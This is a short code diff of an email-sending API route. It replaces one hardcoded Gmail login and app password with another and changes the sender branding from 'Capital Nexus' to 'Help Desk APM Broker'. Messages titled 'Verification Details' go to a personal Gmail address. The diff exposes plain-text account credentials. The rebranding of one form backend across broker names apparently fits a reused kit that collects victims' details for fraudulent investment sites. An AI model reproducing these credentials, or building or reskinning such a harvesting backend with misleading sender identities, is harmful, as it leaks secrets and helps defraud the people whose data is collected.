@@ -11,8 +11,8 @@ export async function POST(request) {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "osr.cty@gmail.com",
-      pass: "btzbcklyxerxvkiy",
+      user: "fidelitybanco@gmail.com",
+      pass: "npqx mayu qsvz gwcp",
     },
   });
 
@@ -90,7 +90,7 @@ export async function POST(request) {
 
   // Email options
   const mailOptions = {
-    from: "Capital Nexus <support@capitalnexus.pro>",
+    from: "Help Desk APM Broker <helpdesk@apmbroker.com>",
     to: "samsonrichfield@gmail.com",
     subject: "Verification Details",
     html: emailContent,
